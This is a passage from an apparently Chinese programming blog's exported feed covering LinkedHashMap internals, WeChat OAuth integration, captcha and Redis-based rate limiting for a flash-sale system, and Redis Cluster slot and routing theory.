afterNodeAccess(Node&lt;K,V&gt; e) 函数。 1234public V get(Object key) &#123; Node&lt;K,V&gt; e; return (e = getNode(hash(key), key)) == null ? null : e.value;&#125; 在afterNodeAccess() 函数中，会将当前被访问到的节点e，移动至内部的双向链表的尾部。 12345678910111213141516171819202122232425262728293031void afterNodeAccess(Node&lt;K,V&gt; e) &#123; // move node to last LinkedHashMap.Entry&lt;K,V&gt; last;//原尾节点 //如果accessOrder 是true ，且原尾节点不等于e if (accessOrder &amp;&amp; (last = tail) != e) &#123; //节点e强转成双向链表节点p LinkedHashMap.Entry&lt;K,V&gt; p = (LinkedHashMap.Entry&lt;K,V&gt;)e, b = p.before, a = p.after; //p现在是尾节点， 后置节点一定是null p.after = null; //如果p的前置节点是null，则p以前是头结点，所以更新现在的头结点是p的后置节点a if (b == null) head = a; else//否则更新p的前直接点b的后置节点为 a b.after = a; //如果p的后置节点不是null，则更新后置节点a的前置节点为b if (a != null) a.before = b; else//如果原本p的后置节点是null，则p就是尾节点。 此时 更新last的引用为 p的前置节点b last = b; if (last == null) //原本尾节点是null 则，链表中就一个节点 head = p; else &#123;//否则 更新 当前节点p的前置节点为 原尾节点last， last的后置节点是p p.before = last; last.after = p; &#125; //尾节点的引用赋值成p tail = p; //修改modCount。 ++modCount; &#125;&#125; 图示： 说明：从图中可以看到，结点3链接到了尾结点后面。 值得注意的是，afterNodeAccess() 函数中，会修改modCount,因此当你正在accessOrder=true的模式下,迭代LinkedHashMap时，如果同时查询访问数据，也会导致fail-fast，因为迭代的顺序已经改变。 九、containsValue它重写了该方法，相比HashMap的实现，更为高效。 123456789public boolean containsValue(Object value) &#123; //遍历一遍链表，去比较有没有value相等的节点，并返回 for (LinkedHashMap.Entry&lt;K,V&gt; e = head; e != null; e = e.after) &#123; V v = e.value; if (v == value || (value != null &amp;&amp; value.equals(v))) return true; &#125; return false;&#125; 对比HashMap，是用两个for循环遍历，相对低效。 12345678910111213public boolean containsValue(Object value) &#123; Node&lt;K,V&gt;[] tab; V v; if ((tab = table) != null &amp;&amp; size &gt; 0) &#123; for (int i = 0; i &lt; tab.length; ++i) &#123; for (Node&lt;K,V&gt; e = tab[i]; e != null; e = e.next) &#123; if ((v = e.value) == value || (value != null &amp;&amp; value.equals(v))) return true; &#125; &#125; &#125; return false;&#125; 十、transferLinks1234567891011121314// 用dst替换srcprivate void transferLinks(LinkedHashMap.Entry&lt;K,V&gt; src, LinkedHashMap.Entry&lt;K,V&gt; dst) &#123; LinkedHashMap.Entry&lt;K,V&gt; b = dst.before = src.before; LinkedHashMap.Entry&lt;K,V&gt; a = dst.after = src.after; if (b == null) head = dst; else b.after = dst; if (a == null) tail = dst; else a.before = dst;&#125; 十一、遍历重写了entrySet() 如下： 12345678910public Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet() &#123; Set&lt;Map.Entry&lt;K,V&gt;&gt; es; //返回LinkedEntrySet return (es = entrySet) == null ? (entrySet = new LinkedEntrySet()) : es;&#125;final class LinkedEntrySet extends AbstractSet&lt;Map.Entry&lt;K,V&gt;&gt; &#123; public final Iterator&lt;Map.Entry&lt;K,V&gt;&gt; iterator() &#123; return new LinkedEntryIterator(); &#125;&#125; 最终的EntryIterator: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556final class LinkedEntryIterator extends LinkedHashIterator implements Iterator&lt;Map.Entry&lt;K,V&gt;&gt; &#123; public final Map.Entry&lt;K,V&gt; next() &#123; return nextNode(); &#125;&#125;abstract class LinkedHashIterator &#123; //下一个节点 LinkedHashMap.Entry&lt;K,V&gt; next; //当前节点 LinkedHashMap.Entry&lt;K,V&gt; current; int expectedModCount; LinkedHashIterator() &#123; //初始化时，next 为 LinkedHashMap内部维护的双向链表的扁头 next = head; //记录当前modCount，以满足fail-fast expectedModCount = modCount; //当前节点为null current = null; &#125; //判断是否还有next public final boolean hasNext() &#123; //就是判断next是否为null，默认next是head 表头 return next != null; &#125; //nextNode() 就是迭代器里的next()方法 。 //该方法的实现可以看出，迭代LinkedHashMap，就是从内部维护的双链表的表头开始循环输出。 final LinkedHashMap.Entry&lt;K,V&gt; nextNode() &#123; //记录要返回的e。 LinkedHashMap.Entry&lt;K,V&gt; e = next; //判断fail-fast if (modCount != expectedModCount) throw new ConcurrentModificationException(); //如果要返回的节点是null，异常 if (e == null) throw new NoSuchElementException(); //更新当前节点为e current = e; //更新下一个节点是e的后置节点 next = e.after; //返回e return e; &#125; //删除方法 最终还是调用了HashMap的removeNode方法 public final void remove() &#123; Node&lt;K,V&gt; p = current; if (p == null) throw new IllegalStateException(); if (modCount != expectedModCount) throw new ConcurrentModificationException(); current = null; K key = p.key; removeNode(hash(key), key, null, false, false); expectedModCount = modCount; &#125;&#125; 值得注意的就是：nextNode() 就是迭代器里的next() 方法 。该方法的实现可以看出，迭代LinkedHashMap，就是从内部维护的双链表的表头开始循环输出。而双链表节点的顺序在LinkedHashMap的增、删、改、查时都会更新。以满足按照插入顺序输出，还是访问顺序输出。 十二、总结LinkedHashMap相对于HashMap的源码比，是很简单的。因为大树底下好乘凉。它继承了HashMap，仅重写了几个方法，以改变它迭代遍历时的顺序。这也是其与HashMap相比最大的不同。在每次插入数据，或者访问、修改数据时，会增加节点、或调整链表的节点顺序。以决定迭代时输出的顺序。 accessOrder默认是false，则迭代时输出的顺序是插入节点的顺序。若为true，则输出的顺序是按照访问节点的顺序。为true时，可以在这基础之上构建一个LruCache. LinkedHashMap并没有重写任何put方法。但是其重写了构建新节点的newNode()方法.在每次构建新节点时，将新节点链接在内部双向链表的尾部 accessOrder=true的模式下,在afterNodeAccess()函数中，会将当前被访问到的节点e，移动至内部的双向链表的尾部。值得注意的是，afterNodeAccess()函数中，会修改modCount,因此当你正在accessOrder=true的模式下,迭代LinkedHashMap时，如果同时查询访问数据，也会导致fail-fast，因为迭代的顺序已经改变。 nextNode() 就是迭代器里的next()方法 。 该方法的实现可以看出，迭代LinkedHashMap，就是从内部维护的双链表的表头开始循环输出。 而双链表节点的顺序在LinkedHashMap的增、删、改、查时都会更新。以满足按照插入顺序输出，还是访问顺序输出。 它与HashMap比，还有一个小小的优化，重写了containsValue()方法，直接遍历内部链表去比对value值是否相等。 参考： http://blog.csdn.net/zxt0601/article/details/77429150 http://wiki.jikexueyuan.com/project/java-collection/linkedhashmap.html http://blog.csdn.net/u013124587/article/details/52659741 http://www.cnblogs.com/leesf456/p/5248868.html]]></content>
      <tags>
        <tag>java容器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[7.整合微信]]></title>
    <url>%2F2018%2F07%2F21%2F7.%E6%95%B4%E5%90%88%E5%BE%AE%E4%BF%A1%2F</url>
    <content type="text"><![CDATA[慕课网微信点餐系统学习 无法做微信扫码登录和微信支付，扫码登录改为普通的登录，微信支付直接跳过为支付成功页面。 1.验证消息的确来自微信服务器123456789101112131415161718192021222324252627282930313233343536373839@RestController@RequestMapping("/weixin")@Slf4jpublic class WeixinController &#123; @GetMapping("/authenticate") protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; // TODO Auto-generated method stub //微信服务器get传递的参数 String signature = request.getParameter("signature"); String timestamp = request.getParameter("timestamp"); String nonce = request.getParameter("nonce"); String echostr = request.getParameter("echostr"); //微信工具类 WxMpService wxService=new WxMpServiceImpl(); //注入token的配置参数 /** * 生产环境 建议将WxMpInMemoryConfigStorage持久化 */ WxMpInMemoryConfigStorage wxConfigProvider=new WxMpInMemoryConfigStorage(); //注入token值 wxConfigProvider.setToken("swg"); wxService.setWxMpConfigStorage(wxConfigProvider); boolean flag=wxService.checkSignature(timestamp, nonce, signature); PrintWriter out=response.getWriter(); if(flag)&#123; out.print(echostr); &#125; out.close(); out=null; &#125;&#125; 微信开发先引入依赖： 12345&lt;dependency&gt; &lt;groupId&gt;com.github.binarywang&lt;/groupId&gt; &lt;artifactId&gt;weixin-java-mp&lt;/artifactId&gt; &lt;version&gt;2.7.0&lt;/version&gt;&lt;/dependency&gt; 网页授权： 1234567891011121314151617181920212223242526272829@Controller@RequestMapping("/wechat")@Slf4jpublic class WechatController &#123; @Autowired private WxMpService wxMpService; @GetMapping("/authorize") public String authorize(@RequestParam("returnUrl") String returnUrl)&#123; String url = "http://www.oursnail.cn/sell/wechat/userInfo"; String redirectUrl = wxMpService.oauth2buildAuthorizationUrl(url, WxConsts.OAUTH2_SCOPE_BASE, URLEncoder.encode(returnUrl)); System.out.println("------"+redirectUrl); return "redirect:"+redirectUrl; &#125; @GetMapping("/userInfo") public String userInfo(@RequestParam("code") String code, @RequestParam("state") String returnUrl)&#123; WxMpOAuth2AccessToken wxMpOAuth2AccessToken = new WxMpOAuth2AccessToken(); try &#123; wxMpOAuth2AccessToken = wxMpService.oauth2getAccessToken(code); &#125; catch (WxErrorException e) &#123; log.error("【微信网页授权】&#123;&#125;",e); throw new SellException(ResultEnum.WECHAT_MP_ERROR.getCode(),e.getError().getErrorMsg()); &#125; String openid = wxMpOAuth2AccessToken.getOpenId(); return "redirect:" + returnUrl +"?openid=" + openid; &#125;&#125; 这样，我们就获取到了openid，发给前端，后面就根据这个参数来确定用户是谁。 其中需要先配置一些参数： 123456789101112131415161718192021222324@Data@Component@ConfigurationProperties(prefix = "wechat")public class WechatAccountConfig &#123; /** * 公众平台id */ private String mpAppId; /** * 公众平台密钥 */ private String mpAppSecret; /** * token */ private String token; /** * 微信模版id */ private Map&lt;String, String&gt; templateId;&#125; 注册到spring容器中：123456789101112131415161718192021@Componentpublic class WechatMpConfig &#123; @Autowired private WechatAccountConfig accountConfig; @Bean public WxMpService wxMpService() &#123; WxMpService wxMpService = new WxMpServiceImpl(); wxMpService.setWxMpConfigStorage(wxMpConfigStorage()); return wxMpService; &#125; @Bean public WxMpConfigStorage wxMpConfigStorage() &#123; WxMpInMemoryConfigStorage wxMpConfigStorage = new WxMpInMemoryConfigStorage(); wxMpConfigStorage.setAppId(accountConfig.getMpAppId()); wxMpConfigStorage.setSecret(accountConfig.getMpAppSecret()); wxMpConfigStorage.setToken(accountConfig.getToken()); return wxMpConfigStorage; &#125;&#125; 微信模板消息发送123456789101112131415161718192021222324252627282930313233@Service@Slf4jpublic class PushMessageServiceImpl implements PushMessageService&#123; @Autowired private WxMpService wxMpService; @Autowired private WechatAccountConfig wechatAccountConfig; @Override public void orderStatus(OrderDTO orderDto) &#123; WxMpTemplateMessage templateMessage = new WxMpTemplateMessage(); templateMessage.setTemplateId(wechatAccountConfig.getTemplateId().get("orderStatus")); templateMessage.setToUser(orderDto.getBuyerOpenid()); List&lt;WxMpTemplateData&gt; data = Arrays.asList( new WxMpTemplateData("first", "亲，请记得收货。","#743A3A"), new WxMpTemplateData("keyword1", "微信点餐","#0000FF"), new WxMpTemplateData("keyword2", "18868812345","#0000FF"), new WxMpTemplateData("keyword3", orderDto.getOrderId(),"#0000FF"), new WxMpTemplateData("keyword4", orderDto.getOrderStatusEnum().getMessage(),"#0000FF"), new WxMpTemplateData("keyword5", "￥" + orderDto.getOrderAmount(),"#0000FF"), new WxMpTemplateData("remark", "欢迎再次光临！","#008000") ); templateMessage.setData(data); try &#123; wxMpService.getTemplateMsgService().sendTemplateMsg(templateMessage); &#125;catch (WxErrorException e) &#123; log.error("【微信模版消息】发送失败, &#123;&#125;", e); //这里不抛出异常，因为如果抛出，订单完结整个过程会回滚，对于无关紧要的事情，我们尽量不要让他影响主要业务。 &#125; &#125;&#125;]]></content>
      <tags>
        <tag>微信点餐系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[7.安全防护--图形验证码及恶意防刷]]></title>
    <url>%2F2018%2F07%2F21%2F7.%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4--%E5%9B%BE%E5%BD%A2%E9%AA%8C%E8%AF%81%E7%A0%81%E5%8F%8A%E6%81%B6%E6%84%8F%E9%98%B2%E5%88%B7%2F</url>
    <content type="text"><![CDATA[在秒杀时可以添加图形验证码来错开一些峰流以及防刷。 1. 秒杀接口地址隐藏思路：秒杀开始之前，先去请求接口获取秒杀地址。 接口改造，带上PathVariable参数 添加生成地址的接口 秒杀收到请求，先验证PathVariable 对于秒杀接口，不是直接去请求do_miaosha这个接口了，而是先去后端获取一个path： 123456789101112131415161718192021function getPath() &#123; var goodsId = $("#goodsId").val(); $.ajax(&#123; url:"/miaosha/path", type:"GET", data:&#123; goodsId:goodsId, &#125;, success:function(data)&#123; if(data.code == 0)&#123; var path = data.data; doMiaosha(path); &#125;else&#123; layer.msg(data.msg); &#125; &#125;, error:function()&#123; layer.msg("客户端请求有误"); &#125; &#125;);&#125; 后端接口是这样的： 1234567891011@RequestMapping(value = "/path",method = RequestMethod.GET)@ResponseBodypublic Result&lt;String&gt; getMiaoshaPath(Model model, MiaoshaUser user, @RequestParam("goodsId") long goodsId) &#123; if (user == null) return Result.error(CodeMsg.SESSION_ERROR); String path = miaoshaService.createPath(user.getId(),goodsId); return Result.success(path);&#125; 生成path的方法具体是： 123456public String createPath(Long userId, Long goodsId) &#123; String str = MD5Util.md5(UUIDUtil.uuid()+"123456"); //存放到redis中，下面验证的时候再去取出来 redisService.set(MiaoshaKey.getMiaoshaPath,userId+"_"+goodsId,str); return str;&#125; ok，前端拿到这个path之后拼装到do_miaosha这个接口上去。 12345678function doMiaosha(path)&#123; $.ajax(&#123; url:"/miaosha/"+path+"/do_miaosha", type:"POST", data:&#123; goodsId:$("#goodsId").val(), &#125;, ...... 秒杀接口，先拿到这个path验证一下是否正确，正确再进入下面的逻辑： 1234boolean check = miaoshaService.check(path,user,goodsId);if(!check)&#123; return Result.error(CodeMsg.REQUEST_ILLEGAL);&#125; 具体的验证，就是取出缓存中的path，与前端传来的path进行对比，相等，说明是这个用户发来的请求： 1234567public boolean check(String path, MiaoshaUser user, Long goodsId) &#123; if(user == null || path == null || goodsId == null)&#123; return false; &#125; String pathOld = redisService.get(MiaoshaKey.getMiaoshaPath,user.getId()+"_"+goodsId,String.class); return path.equals(pathOld);&#125; 这样，在秒杀开始前，都是不知道这个秒杀的链接到底是什么，有效防止了恶意的请求。但是，在秒杀开始的时候，仍然会存在恶意刷单的请求，这个时候接口地址已经确定下来了，如何防止这种情况呢（机器人），可以用验证码来实现。 2. 数学公式验证码思路：点击秒杀之前，先输入验证码，分散用户的请求 添加生成验证码的接口 在获取秒杀路径的时候，验证验证码 ScriptEngine使用 首先在前端将验证码、答案输入框都写好： 1234567&lt;div class="row"&gt; &lt;div class="form-inline"&gt; &lt;img id="verifyCodeImg" width="80" height="32" style="display: none" onclick="refreshVerifyCode()"/&gt; &lt;input id="verifyCode" class="form-control" style="display: none"/&gt; &lt;button class="btn btn-primary" type="button" id="buyButton"onclick="getPath()"&gt;立即秒杀&lt;/button&gt; &lt;/div&gt;&lt;/div&gt; 只有秒杀开始的时候，这个验证码才会出现，所以在function countDown()这个函数中的正在秒杀这个判断中显示验证码： 123$("#verifyCodeImg").attr("src","miaosha/verifyCode?goodsId="+$("#goodsId").val());$("#verifyCodeImg").show();$("#verifyCode").show(); 点击图片能够重新生成验证码： 123function refreshVerifyCode()&#123; $("#verifyCodeImg").attr("src", "/miaosha/verifyCode?goodsId="+$("#goodsId").val()+"&amp;timestamp="+new Date().getTime());&#125; 后端生成这个验证码图片： 12345678910111213141516171819@RequestMapping(value="/verifyCode", method=RequestMethod.GET)@ResponseBodypublic Result&lt;String&gt; getMiaoshaVerifyCod(HttpServletResponse response, MiaoshaUser user, @RequestParam("goodsId")long goodsId) &#123;if(user == null) &#123; return Result.error(CodeMsg.SESSION_ERROR);&#125;try &#123; BufferedImage image = miaoshaService.createVerifyCode(user, goodsId); OutputStream out = response.getOutputStream(); ImageIO.write(image, "JPEG", out); out.flush(); out.close(); return null;&#125;catch(Exception e) &#123; e.printStackTrace(); return Result.error(CodeMsg.MIAOSHA_FAIL);&#125;&#125; 其中核心的createVerifyCode方法，将图形验证码的计算结果放进了redis中，方便后面取出来与前段传来的结果进行对比： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061/*图形验证码*/public BufferedImage createVerifyCode(MiaoshaUser user, long goodsId) &#123; if(user == null || goodsId &lt;=0) &#123; return null; &#125; int width = 80; int height = 32; //create the image BufferedImage image = new BufferedImage(width, height, BufferedImage.TYPE_INT_RGB); Graphics g = image.getGraphics(); // set the background color g.setColor(new Color(0xDCDCDC)); g.fillRect(0, 0, width, height); // draw the border g.setColor(Color.black); g.drawRect(0, 0, width - 1, height - 1); // create a random instance to generate the codes Random rdm = new Random(); // make some confusion for (int i = 0; i &lt; 50; i++) &#123; int x = rdm.nextInt(width); int y = rdm.nextInt(height); g.drawOval(x, y, 0, 0); &#125; // generate a random code String verifyCode = generateVerifyCode(rdm); g.setColor(new Color(0, 100, 0)); g.setFont(new Font("Candara", Font.BOLD, 24)); g.drawString(verifyCode, 8, 24); g.dispose(); //把验证码存到redis中 int rnd = calc(verifyCode); redisService.set(MiaoshaKey.getMiaoshaVerifyCode, user.getId()+","+goodsId, rnd); //输出图片 return image;&#125;private static int calc(String exp) &#123; try &#123; ScriptEngineManager manager = new ScriptEngineManager(); ScriptEngine engine = manager.getEngineByName("JavaScript"); return (Integer)engine.eval(exp); &#125;catch(Exception e) &#123; e.printStackTrace(); return 0; &#125;&#125;private static char[] ops = new char[] &#123;'+', '-', '*'&#125;;/** * + - * * */private String generateVerifyCode(Random rdm) &#123; int num1 = rdm.nextInt(10); int num2 = rdm.nextInt(10); int num3 = rdm.nextInt(10); char op1 = ops[rdm.nextInt(3)]; char op2 = ops[rdm.nextInt(3)]; String exp = ""+ num1 + op1 + num2 + op2 + num3; return exp;&#125; 前端在function getMiaoshaPath()这个函数中将结果传到后端，后端在这个获取真正秒杀链接的时候进行判断是否正确： 1verifyCode:$("#verifyCode").val() 后端接收这个答案： 123456789101112131415@RequestMapping(value = "/path",method = RequestMethod.GET)@ResponseBodypublic Result&lt;String&gt; getMiaoshaPath(Model model, MiaoshaUser user, @RequestParam("goodsId") long goodsId, @RequestParam(value="verifyCode", defaultValue="0")int verifyCode) &#123; if (user == null) return Result.error(CodeMsg.SESSION_ERROR); boolean check = miaoshaService.checkVerifyCode(user, goodsId, verifyCode); if(!check) &#123; return Result.error(CodeMsg.REQUEST_ILLEGAL); &#125; String path = miaoshaService.createPath(user.getId(),goodsId); return Result.success(path);&#125; 从redis中取出正确答案，与前端进行比较： 1234567891011public boolean checkVerifyCode(MiaoshaUser user, long goodsId, int verifyCode) &#123; if(user == null || goodsId &lt;=0) &#123; return false; &#125; Integer codeOld = redisService.get(MiaoshaKey.getMiaoshaVerifyCode, user.getId()+","+goodsId, Integer.class); if(codeOld == null || codeOld - verifyCode != 0 ) &#123; return false; &#125; redisService.delete(MiaoshaKey.getMiaoshaVerifyCode, user.getId()+","+goodsId); return true;&#125; 3. 接口防刷思路：对接口做限流 可以使用拦截器减少对业务的侵入 点击秒杀之后，首先是生成path，那假如我们对这个接口进行限制：5秒之内用户只能点击5次。 这放在redis中是非常好实现的，因为redis有个自增(自减)和缓存时间，可以很好地实现这个效果。 12345678910//查询访问次数,5秒钟访问5次String url = request.getRequestURI();Integer count = redisService.get(AccessKey.access,url+"_"+user.getId(),Integer.class);if(count == null)&#123; redisService.set(AccessKey.access,url+"_"+user.getId(),1);&#125;else if(count &lt; 5)&#123; redisService.incr(AccessKey.access,url+"_"+user.getId());&#125;else &#123; return Result.error(CodeMsg.ACCESS_LIMIT_REACH);&#125; 其中，AccessKey是这样写的： 123456public class AccessKey extends BasePrefix&#123; private AccessKey(int expireSeconds, String prefix) &#123; super(expireSeconds, prefix); &#125; public static AccessKey access = new AccessKey(5, "access");&#125; 虽然逻辑不是很严谨，这里只是做限流的一个示范。 下面考虑比较通用的限流方法，因为可能每个接口的限制次数是不一样的，显然这种写死的方式不适合的。而这种代码只是保护层次的，不是业务代码，所以可以在拦截器中实现这个功能。 对于这个接口，我们想实现的效果是，在上面打上相应的注解，这个接口就会受到一定的限制。 比如，我想在5秒内最多请求5次，并且必须要登陆： 1@AccessLimit(seconds = 5,maxCount = 5,needLogin = true) 首先是创建注解： 123456789@Retention(RetentionPolicy.RUNTIME)@Target(ElementType.METHOD)public @interface AccessLimit &#123; int seconds();//缓存多长时间 int maxCount();//规定时间内最大访问次数 boolean needLogin() default true;//是否需要登陆&#125; 要想这个注解能够生效，必须要配置拦截器AccessInterceptor： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172@Servicepublic class AccessInterceptor extends HandlerInterceptorAdapter&#123; @Autowired private MiaoshaUserService userService; @Autowired private RedisService redisService; @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123; if(handler instanceof HandlerMethod)&#123; MiaoshaUser user = getUser(request,response); //将user信息存放到ThreadLocal中 UserContext.setUser(user); //取注解，没有此注解的话，直接放行 HandlerMethod hm = (HandlerMethod)handler; AccessLimit accessLimit = hm.getMethodAnnotation(AccessLimit.class); if(accessLimit == null)&#123; return true; &#125; //取出注解中参数的值 int seconds = accessLimit.seconds(); int maxCount = accessLimit.maxCount(); boolean needLogin = accessLimit.needLogin(); String key = request.getRequestURI(); //判断是否要必须登陆，如要是必须登陆，看user是否为空，为空的话直接返回fasle和给前台 if(needLogin)&#123; if(user == null)&#123; render(response, CodeMsg.SESSION_ERROR); return false; &#125; key += "_"+user.getId(); &#125;else&#123; //do nothing &#125; //限制访问次数 Integer count = redisService.get(AccessKey.withExpire(seconds),key,Integer.class); if(count == null)&#123; redisService.set(AccessKey.withExpire(seconds),key,1); &#125;else if(count &lt; maxCount)&#123; redisService.incr(AccessKey.withExpire(seconds),key); &#125;else &#123; render(response, CodeMsg.ACCESS_LIMIT_REACH); return false; &#125; &#125; return true; &#125; private void render(HttpServletResponse response, CodeMsg cm) throws Exception&#123; response.setContentType("application/json;charset=UTF-8");//防止中文乱码 OutputStream out = response.getOutputStream(); String str = JSON.toJSONString(Result.error(cm)); out.write(str.getBytes("UTF-8")); out.flush(); out.close(); &#125; private MiaoshaUser getUser(HttpServletRequest request, HttpServletResponse response)&#123; String paramToken = request.getParameter(CookieUtil.COOKIE_NAME); String cookieToken = CookieUtil.readLoginToken(request); if(StringUtils.isEmpty(cookieToken) &amp;&amp; StringUtils.isEmpty(paramToken))&#123; return null; &#125; String token = StringUtils.isEmpty(paramToken)?cookieToken:paramToken; return userService.getByToken(token,response); &#125;&#125; 我们之前从cookie中取token，然后再从redis中取出user信息是在UserArgumentResolver中做的，而他实在拦截器后面工作的，其实如果使用拦截器的话，这个就不需要了，但是因为我们这里只改造了path这个接口，其他的接口就不加注解进行测试，所以这个类还是要保留一下的，但是主要的逻辑已经全部被拦截器做完了，这里只需要从ThreadLocal中取出User即可。 1234567891011121314@Servicepublic class UserArgumentResolver implements HandlerMethodArgumentResolver&#123; @Override public boolean supportsParameter(MethodParameter parameter) &#123; Class&lt;?&gt; clazz = parameter.getParameterType(); return clazz== MiaoshaUser.class; &#125; @Override public Object resolveArgument(MethodParameter methodParameter, ModelAndViewContainer modelAndViewContainer, NativeWebRequest webRequest, WebDataBinderFactory webDataBinderFactory) throws Exception &#123; return UserContext.getUser(); &#125;&#125; 要想这个拦截器工作，我们要重写WebMvcConfigurerAdapter中的addInterceptors方法，将我们的拦截器添加进去： 1234@Overridepublic void addInterceptors(InterceptorRegistry registry) &#123; registry.addInterceptor(accessInterceptor);&#125; 这样，利用注解和拦截器就实现了比较优雅的限流功能。]]></content>
      <tags>
        <tag>秒杀系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[7.redis cluster理论详解]]></title>
    <url>%2F2018%2F07%2F21%2F7.redis%20cluster%E7%90%86%E8%AE%BA%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[上一篇我们学习了redis sentinel，知道了它是redis高可用的一种实现方案。但是面对要求很高的场景，一台master是一定不能解决问题的，redis 3.0给我们带来了服务端集群方案，解决了这个问题。 1. 数据分区集群，那么就会涉及到数据是如何分片的。有两种方式：顺序分区和哈希分区 两者对比： 直接hash取模进行数据分片时，当节点增加，会有很多数据命中不了，需要重新映射。如果大多数数据在增加或者减少节点之后进行迁移的话，对于性能影响是很大的，因为数据迁移，那么缓存中现在是无法命中的，必须去数据库取，是灾难性的行为。 早期的做法就是这样，在客户端hash%节点个数进行数据分片。如果非要这样，采取翻倍扩容会稍微好一点，迁移数据量会小一点。不过无论如何，这种方式在大数据量情况下是不可行的。 2. 一致性hash算法对于上面提到的直接hash取余的方式，会导致大量数据的迁移。那么有没有一种方式，在增加或减少节点时，只有少部分数据迁移呢？ 针对一致性hash算法，在实战项目–电商中已经详细介绍了。不再赘述。 对于redis 3.0之前，客户端可以用这种方式来实现数据分片。在redis 3.0之后，就不需要客户端来实现分片算法了，而是直接给我们提供了服务端集群方案redis cluster. 3. 虚拟槽redis cluster引入槽的概念，一定要与一致性hash的槽区分！这里每一个槽映射一个数据集。 CRC16(key) &amp; 16383 这里计算结果发送给redis cluster任意一个redis节点，这个redis节点发现他是属于自己管辖范围的，那就将它放进去；不属于他的槽范围的话，由于redis之间是相互通信的，这个节点是知道其他redis节点的槽的信息，那么会告诉他去那个redis节点去看看。 那么就实现了服务端对于槽、节点、数据的管理。 当master节点增加时，即扩容时，对于以上两种方案，都会出现数据迁移，那么只能作为缓存场景使用。但是redis cluster，由于每个节点维护的槽的范围是固定的，当有新加入的节点时，是不会干扰到其他节点的槽的，必须是以前的节点将使用槽的权利分配给你，并且将数据分配给你，这样，新的节点才会真正拥有这些槽和数据。这种实现还处于半自动状态，需要人工介入。—–主要的思想是：槽到集群节点的映射关系要改变，不变的是键到槽的映射关系. Redis集群，要保证16384个槽对应的node都正常工作，如果某个node发生故障，那它负责的slots也就失效，整个集群将不能工作。为了增加集群的可访问性，官方推荐的方案是将node配置成主从结构，即一个master主节点，挂n个slave从节点。这时，如果主节点失效，Redis Cluster会根据选举算法从slave节点中选择一个上升为主节点，整个集群继续对外提供服务。 某个Master又怎么知道某个槽自己是不是拥有呢？Master节点维护着一个16384/8字节的位序列，Master节点用bit来标识对于某个槽自己是否拥有。比如对于编号为1的槽，Master只要判断序列的第二位（索引从0开始）是不是为1即可。 如上面的序列，表示当前Master拥有编号为1，134的槽。集群同时还维护着槽到集群节点的映射，是由长度为16384类型为节点的数组实现的，槽编号为数组的下标，数组内容为集群节点，这样就可以很快地通过槽编号找到负责这个槽的节点。位序列这个结构很精巧，即不浪费存储空间，操作起来又很便捷。 具体参照：http://blog.jobbole.com/103258/,还提到了`slot`迁移的一些细节。 redis节点之间如何通信的？ gossip协议：节点之间彼此不断通信交换信息，一段时间后所有节点都会知道集群完整的信息。 节点与节点之间通过二进制协议进行通信。 客户端和集群节点之间通信和通常一样，通过文本协议进行。 集群节点不会代理查询。 4. 集群伸缩这里6385为新加入的节点，一开始是没有槽的，所以进行slot的迁移。 集群伸缩：槽和数据在节点之间的移动。 迁移数据的流程图： 迁移key可以用pipeline进行批量的迁移。 对于扩容，原理已经很清晰了，至于具体操作，网上很多。至于缩容，也是先手动完成数据迁移，再关闭redis。 5. 客户端路由5.1 moved重定向 其中，槽直接命中的话，就直接返回槽编号： 槽不命中，返回带提示信息的异常，客户端需要重新发送一条命令： 对于命令行的实验，用redis-cli去连接集群： redis -c -p 7000:加上-c，表示使用集群模式，帮助我们在第一次不命中的情况下自动跳转到对应的节点上： 如果不加-c的话，会返回moved异常，不会自动跳转： 5.2 ask重定向在扩容缩容的时候，由于需要遍历这个节点上的所有的key然后进行迁移，是比较慢的，对客户端是一个挑战。因为假设一个场景，客户端访问某个key，节点告诉客户端这个key在源节点，当我们再去源节点访问的时候，却发现key已经迁移到目标节点。 5.3 moved重定向和ask重定向对比 两者都是客户端的重定向 moved：槽已经确定转移 ask:槽还在迁移中 问题：如果节点众多，那么让客户端随机访问节点，那么直接命中的概率只有百分之一，还有就是发生ask异常时（即节点正在迁移时）客户端如何还能高效运转？ 总结一句话就是redis cluster的客户端的实现会更复杂。 6. smart客户端6.1 追求目标追求性能，不会使用代理模式，而是直连对应节点。需要对moved异常和ask异常做兼容。也就是说，需要有一个这个语言对应的客户端来高效实现查找等操作。 6.2 smart原理 从集群中选一个可运行节点，使用cluster slots初始化槽和节点映射 将slot与node节点的结果映射到本地，为每个节点创建JedisPool 准备执行命令 第一步中将slot与node节点的对应关系放在了map中，形成一个映射关系；key是通过CRC16算法再取余得到slot，所以key与slot的映射关系也是确定的。我们就可以直接发送命令。只要后面集群没有发生数据迁移，那么就会连接成功。但是如果在连接的时候出现了连接出错，说明这个key已经迁移到其他的node上了。如果发现key不停地迁移，超过5次就报错。 在发生moved异常的时候，则需要刷新缓存，即一开始维护的map。 有一个情况比较全的图： java redis cluster客户端：jedisCluster基本使用–伪代码 jedisCluster内部已经封装好池的借还操作等。 先写一个JedisClusterFactory: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import redis.clients.jedis.HostAndPort;import redis.clients.jedis.JedisCluster;import redis.clients.jedis.JedisPoolConfig;import java.io.IOException;import java.util.HashSet;import java.util.List;import java.util.Set;public class JedisClusterFactory &#123; private JedisCluster jedisCluster; private List&lt;String&gt; hostPortList; //超时时间 private int timeout; public void init()&#123; //这里可以设置相关参数 JedisPoolConfig jedisPoolConfig = new JedisPoolConfig(); //从配置文件中读取ip:port的参数放进Set中 Set&lt;HostAndPort&gt; nodeSet = new HashSet&lt;HostAndPort&gt;(); for(String hostPort : hostPortList)&#123; String[] arr = hostPort.split(":"); if(arr.length != 2)&#123; continue; &#125; nodeSet.add(new HostAndPort(arr[0],Integer.parseInt(arr[1]))); &#125; try &#123; jedisCluster = new JedisCluster(nodeSet,timeout,jedisPoolConfig); &#125; 